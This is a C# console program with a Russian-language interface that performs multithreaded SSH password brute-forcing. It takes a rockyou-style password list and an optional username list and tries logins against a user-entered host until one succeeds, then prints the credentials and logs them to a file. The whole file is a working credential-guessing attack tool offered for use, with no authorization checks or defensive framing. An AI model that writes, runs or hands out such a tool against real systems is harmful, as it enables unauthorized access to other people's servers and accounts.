using System;
using Renci.SshNet;
using Renci.SshNet.Common;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using System.ComponentModel.Design;
using System.Formats.Asn1;
using System.Runtime.InteropServices.Marshalling;

class Program
{
    static string filePath = "rockyou10000.txt";
    static int maxThreads = 15;

    static string userfilePath = "usernames.txt";

    static bool ifusername = false;

    static object consoleLock = new object();

    static volatile bool stopAll = false;

    static async Task Main()
    {

        while (true)
        {
            int choice = ShowMenu();

            switch (choice)
            {
                case 0:
                    stopAll = false;
                    await RunBrute();
                    break;
                case 1:
                    ShowSettings();
                    break;
                case 2:
                    Exit();
                    return;
            }
        }
    }

    // меню
    static int ShowMenu()
    {
        int selected = 0;

        while (true)
        {
            Console.Clear();

            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("===== SSH BRUTE=====\n");
            Console.ResetColor();

            Console.WriteLine($"1. Старт");
            Console.WriteLine($"2. Настройки");
            Console.WriteLine("3. Выход");

            var key = Console.ReadKey(true).Key;

            if (key == ConsoleKey.D1)
            {
                selected = 0;
                return selected;
            }
            else if (key == ConsoleKey.D2)
            {
                selected = 1;
                return selected;
            }
            else if (key == ConsoleKey.D3)
            {
                selected = 2;
                return selected;
            }
            else
            {
                Console.WriteLine("Невозможный выбор");
                Main();       
            }
        }
    }

    // основная функция брутфорса
    static async Task RunBrute()
    {
        Console.Clear();

        if (!File.Exists(filePath))
        {
            WriteColored("Файл словаря не найден.", ConsoleColor.Red);
            Wait();
            return;
        }
        if (!File.Exists(userfilePath) && ifusername == true)
        {
            WriteColored("Файл словаря имен не найден.", ConsoleColor.Red);
            Wait();
            return;
        }

        var dictionary = File.ReadAllLines(filePath)
                             .Where(x => !string.IsNullOrWhiteSpace(x))
                             .ToList();
        var userdictionary = File.ReadAllLines(userfilePath)
                             .Where(x => !string.IsNullOrWhiteSpace(x))
                             .ToList();

        Console.Write("Введите IP или домен [q для выхода]: ");
        string host = Console.ReadLine();
        if (host == "q") return;

        string username = null;
        if (ifusername == false)
        {
            Console.Write("Введите пользователя [q для выхода]: ");
            username = Console.ReadLine();
            if (username == "q") return;
        }


        Console.Clear();
        Console.WriteLine("=== Подбор запущен ===\n");

        int checkedCount = 0;

        var semaphore = new SemaphoreSlim(maxThreads);
        int found = 0;

        int progressLine = Console.CursorTop;

        var tasks = new List<Task>();

        var outerItems = ifusername ? userdictionary : new List<string> { username };

        int totalCombinations = ifusername ? dictionary.Count * outerItems.Count : dictionary.Count;

        int userIndex = 0;
        foreach (var user in outerItems)
        {
            userIndex++;
            foreach (string password in dictionary)
            {
                if (stopAll)
                    break;

                await semaphore.WaitAsync();

                var localUsername = user;
                var localPassword = password;
                var localUserIndex = userIndex;


                var task = Task.Run(() =>
                {
                    try
                    {
                        if (stopAll)
                            return;

                        using (var client = new SshClient(host, localUsername, localPassword))
                        {
                            client.Connect();

                            if (client.IsConnected &&
                                Interlocked.CompareExchange(ref found, 1, 0) == 0)
                            {
                                client.Disconnect();
                                stopAll = true;

                                lock (consoleLock)
                                {
                                    int skip = ifusername ? 10 : 8;                                    
                                    Console.SetCursorPosition(0, progressLine + skip);

                                    WriteColored("\n=== УСПЕХ ===", ConsoleColor.Green);
                                    Console.WriteLine($"IP: {host}");
                                    Console.WriteLine($"User: {localUsername}");
                                    Console.WriteLine($"Password: {password}");
                                    if (client.IsConnected)
                                        {Console.WriteLine("Клиент не отключен");}
                                    else 
                                        {Console.WriteLine("Клиент отключен");}

                                    File.AppendAllText("log.txt",
                                        $"SUCCESS {host} {username} {password}\n");
                                }
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        // Console.WriteLine("Ошибка: " + ex.Message);
                    }
                    finally
                    {
                        Interlocked.Increment(ref checkedCount);

                        if (!stopAll)
                        {
                            lock (consoleLock)
                            {
                                DrawStatus(progressLine, checkedCount, totalCombinations, dictionary.Count, localUserIndex, outerItems.Count, localUsername);

                            }
                        }

                        semaphore.Release();
                    }
                });
                tasks.Add(task);
            }

        }

        await Task.WhenAll(tasks);

        WriteColored("\nПароль найден! Результат добавлен в log.txt", ConsoleColor.Cyan);
        Wait();
    }

    // вывод статуса
    static void DrawStatus(int line, int checkedCount, int totalCombinations, int passwordsPerUser, int currentUserIndex = 0, int totalUsers = 0, string currentUser = "")
    {
        double progress = (double)checkedCount / totalCombinations;
        int barWidth = 40;
        int filled = (int)(progress * barWidth);

        string bar = "[" + new string('█', filled) + new string('░', barWidth - filled) + "]";

        Console.SetCursorPosition(0, line);
        Console.ForegroundColor = ConsoleColor.Cyan;
        Console.Write($"ПРОГРЕСС: {bar} {(progress * 100):F1}%   ");
        Console.ResetColor();

        Console.SetCursorPosition(0, line + 1);
        if (ifusername == false)
        {
            Console.Write(
                $"+—————————————————————+—————————————————————+—————————————————————+\n" +
                $"│                     │     Проверяется     │        Всего        │\n" +
                $"+—————————————————————+—————————————————————+—————————————————————+\n" +
                $"│      Юзернейм       │ {$"{currentUser}",-19} │                     │\n" +
                $"+—————————————————————+—————————————————————+—————————————————————+\n" +
                $"│       Пароль        │ {checkedCount,-19} │ {passwordsPerUser,-19} │\n" +
                $"+—————————————————————+—————————————————————+—————————————————————+"
            );
        }
        else
        {
            int passwordsCheckedForUser = checkedCount - (currentUserIndex - 1) * passwordsPerUser;
            Console.Write(
                $"+—————————————————————+—————————————————————+—————————————————————+\n" +
                $"|                     │     Проверяется     │        Всего        │\n" +
                $"+—————————————————————+—————————————————————+—————————————————————+\n" +
                $"|      Юзернейм       │ {$"{currentUserIndex}. {currentUser}",-19} │ {totalUsers,-19} │\n" +
                $"+—————————————————————+—————————————————————+—————————————————————+\n" +
                $"|       Пароль        │ {passwordsCheckedForUser,-19} │ {passwordsPerUser,-19} │\n" +
                $"+—————————————————————+—————————————————————+—————————————————————+\n" +
                $"|   Комбинаций всего  │ {checkedCount,-19} │ {totalCombinations,-19} │\n" +
                $"+—————————————————————+—————————————————————+—————————————————————+"
            );
        }
    }

    // настройки
    static void ShowSettings()
    {
        while (true)
        {
            Console.Clear();

            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("===== НАСТРОЙКИ =====\n");
            Console.ResetColor();

            Console.WriteLine($"1. Потоки: {maxThreads}");
            Console.WriteLine($"2. Словарь: {filePath}");
            Console.WriteLine($"3. Словарь юзернеймов: {userfilePath}");
            Console.WriteLine($"4. Перебор юзернеймов: {(ifusername ? "Включен" : "Выключен")}");
            Console.WriteLine("5. Назад");

            var key = Console.ReadKey(true).Key;

            if (key == ConsoleKey.D1)
            {
                Console.Write("\nНовое значение: ");
                if (int.TryParse(Console.ReadLine(), out int t))
                    maxThreads = t;
            }
            else if (key == ConsoleKey.D2)
            {
                Console.Write("\nНовый путь: ");
                filePath = Console.ReadLine();
            }
            else if (key == ConsoleKey.D3)
            {
                Console.Write("\nНовый путь: ");
                userfilePath = Console.ReadLine();
            }
            else if (key == ConsoleKey.D4)
                ifusername = !ifusername;
            else if (key == ConsoleKey.D5)
                return;
        }
    }

    static void WriteColored(string text, ConsoleColor color)
    {
        Console.ForegroundColor = color;
        Console.WriteLine(text);
        Console.ResetColor();
    }

    static void Wait()
    {
        Console.WriteLine("\nНажмите любую клавишу...");
        Console.ReadKey();
    }

    static void Exit()
    {
        Console.Clear();
        WriteColored("Выход...", ConsoleColor.Magenta);
        Thread.Sleep(1000);
    }
}